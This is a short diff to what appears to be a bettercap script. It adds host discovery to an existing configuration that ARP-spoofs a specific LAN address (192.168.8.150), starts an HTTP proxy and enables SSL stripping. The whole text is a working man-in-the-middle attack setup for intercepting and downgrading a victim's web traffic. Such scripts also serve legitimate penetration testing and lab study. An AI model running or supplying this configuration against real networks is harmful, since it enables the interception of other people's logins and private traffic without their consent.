@@ -1,5 +1,13 @@
+
+# discover a few hosts 
+net.probe on
+sleep 1
+net.probe off
+
+
 set http.proxy.sslstrip true
 set net.sniff.verbose false
+set net.sniff.local false
 set arp.spoof.targets 192.168.8.150
 arp.spoof on
 http.proxy on
